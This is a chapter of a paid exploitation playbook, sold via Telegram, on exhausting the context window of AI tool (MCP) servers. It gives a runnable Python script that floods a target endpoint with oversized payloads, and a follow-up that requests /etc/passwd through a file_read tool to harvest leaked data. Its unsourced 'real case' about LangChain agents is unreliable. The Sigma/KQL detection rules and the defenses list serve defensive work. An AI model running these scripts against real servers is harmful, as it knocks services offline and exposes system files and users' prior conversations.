# Chapter 04 — Context Exhaustion
## The 9099 Files — MCP Exploitation Playbook

---

## What It Is

MCP tools that consume user input and feed it into the model's context window have a size limit. An attacker can send input designed to exhaust the context window, causing the model to fail, crash, or behave unpredictably. In some cases, this can cause the tool to leak data in error messages or bypass safety controls when the model is in an error state.

This is a denial-of-service vector specifically for AI-powered tools. It's also a potential information disclosure path — when models are overloaded, they sometimes output things they shouldn't.

---

## Why This Works

Context windows have hard limits. When you send a prompt that approaches or exceeds that limit, the model either truncates aggressively or throws an error. Some MCP tool implementations expose those errors to the caller, including partial context that was supposed to be processed.

The attack works because: (1) most MCP servers don't enforce input length limits before sending to the model, and (2) error states in AI systems often have relaxed security controls because they're handling an unexpected situation.

---

## The Attack

### Step 1 — Identify the Context Limit

```python
#!/usr/bin/env python3
"""
MCP Context Exhaustion Tester
Find the context window limit and test error-state behavior
"""
import requests
import json
import sys
import time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

def send_large_payload(target, size_kb):
    """Send a payload designed to approach context limit"""
    # Generate large text that looks like normal input
    padding = "The following is a detailed report. " * (size_kb * 20)
    
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "analyze",  # Generic analysis tool
            "arguments": {"text": padding + "What is the capital of France?"}
        }
    }
    
    try:
        r = requests.post(f"{target}/mcp/call", json=payload, timeout=30)
        return r.json()
    except Exception as e:
        return {"error": str(e)}

def test_context_limit(target):
    print(f"[*] MCP Context Exhaustion Tester")
    print(f"[*] Target: {TARGET}\n")
    
    sizes = [10, 50, 100, 200, 500, 1000]  # KB
    results = []
    
    for size in sizes:
        print(f"[*] Testing {size}KB payload...", end="", flush=True)
        result = send_large_payload(target, size)
        result_str = json.dumps(result)
        
        if "error" in result_str:
            print(f" ERROR: {result_str[:100]}")
            results.append((size, "error", result_str))
        elif len(result_str) > 50000:
            print(f" LARGE RESPONSE ({len(result_str)} bytes)")
            results.append((size, "overflow", result_str))
        elif len(result_str) < 20:
            print(f" EMPTY/TRUNCATED")
            results.append((size, "empty", result_str))
        else:
            print(f" OK ({len(result_str)} bytes)")
            results.append((size, "ok", result_str))
        
        time.sleep(0.5)
    
    print("\n[*] Summary:")
    for size, status, data in results:
        if status != "ok":
            print(f"  [!] {size}KB → {status.upper()}: {data[:200]}")

if __name__ == "__main__":
    test_context_limit(TARGET)
```

### Step 2 — Trigger Error State and Observe

```python
def test_error_state_leak(target):
    """After exhausting context, see if error response leaks data"""
    # First exhaust
    send_large_payload(target, 500)
    
    # Then try a normal request
    payload = {
        "jsonrpc": "2.0",
        "id": 2,
        "method": "tools/call",
        "params": {
            "name": "file_read",
            "arguments": {"path": "/etc/passwd"}
        }
    }
    r = requests.post(f"{target}/mcp/call", json=payload, timeout=15)
    result = r.json()
    
    # Check if previous context leaked into this response
    if "root:" in json.dumps(result) or "last_stage_error" in json.dumps(result):
        print("[!] ERROR STATE LEAK: Previous context visible in new request")

if __name__ == "__main__":
    test_error_state_leak(TARGET)
```

### Step 3 — Check for Timeout Behavior

Some MCP servers have request timeouts. When a request exceeds a timeout, some implementations return partial data instead of an error. If you can identify the timeout duration, you can craft payloads that exceed it and observe how the server handles the partial completion.

---

## Real Case

**Context window exhaustion in LangChain-based agents**

LangChain-based agents that use MCP tools have documented cases where submitting very long prompts causes the agent to enter an error state. In some configurations, the error state returns the full conversation history to the user — including previous sensitive data that should have remained in context. This is still being patched across various implementations.

---

## Detection Rules

### KQL

```kql
MCP_ToolInputs
| where RequestSizeKB > 50  // Tune based on your context window size
| project TimeGenerated, ToolName, RequestSizeKB, ResponseSizeKB, DurationMs
| where DurationMs > 30000    // Requests taking unusually long
```

### Sigma

```yaml
title: MCP Context Exhaustion Attempt
log_source: mcp_server
detection:
  selection:
    event.type: tool_call
    request.size|gt: 50000
    or:
      - duration|gt: 30000
      - error.message|contains: "context"
  condition: selection
level: medium
```

---

## Defenses

1. **Enforce input length limits before the model** — Validate all user input length server-side before it reaches the model context. Set a hard limit significantly below your context window size.

2. **Error state isolation** — When the MCP server encounters a context error, ensure the error response does not include prior conversation context. Return only the error code and a generic message.

3. **Timeout with data cleanup** — If a request times out, ensure partial state is cleaned up. Don't allow the agent to resume from an incomplete context state on the next request.

4. **Rate limiting** — Limit the number of requests per session and the total tokens per session. This naturally throttles exhaustion attempts.

5. **Monitor for oversized requests** — Set alerts for requests exceeding a threshold percentage of your context window size. Most legitimate requests shouldn't approach the limit.

---

**$29 USDT — Full Playbook with 10 Chapters**

TX hash to `@hunnidinnit` on Telegram.